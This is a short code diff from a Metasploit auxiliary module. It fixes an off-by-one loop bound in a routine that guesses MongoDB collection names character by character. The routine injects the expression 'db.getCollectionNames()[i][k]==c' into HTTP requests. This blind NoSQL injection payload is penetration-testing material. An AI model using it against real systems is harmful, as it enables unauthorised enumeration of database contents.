@@ -119,7 +119,7 @@ class Metasploit4 < Msf::Auxiliary
       vprint_status("Getting collection #{i}'s name")
 
       name = ''
-      (0..name_len).each do |k|
+      (0..name_len-1).each do |k|
         [*('a'..'z'),*('0'..'9')].each do |c|
           str = "db.getCollectionNames()[#{i}][#{k}]=='#{c}'"
           res = send_request_cgi({
